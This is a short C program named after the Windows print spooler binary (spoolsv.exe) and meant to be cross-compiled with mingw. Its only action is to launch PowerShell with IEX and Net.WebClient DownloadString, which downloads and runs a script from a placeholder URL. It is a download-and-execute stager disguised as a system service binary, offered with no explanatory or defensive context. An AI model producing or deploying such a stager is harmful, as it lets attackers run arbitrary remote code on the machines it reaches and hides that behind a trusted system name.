#include <stdio.h>
#include <stdlib.h>
//Compile with: i686-w64-mingw32-gcc spoolsv.c -o spoolsv.exe
int main()
{
	system("powershell IEX (New-Object Net.WebClient).DownloadString('<URL>')");
	return 0;
}
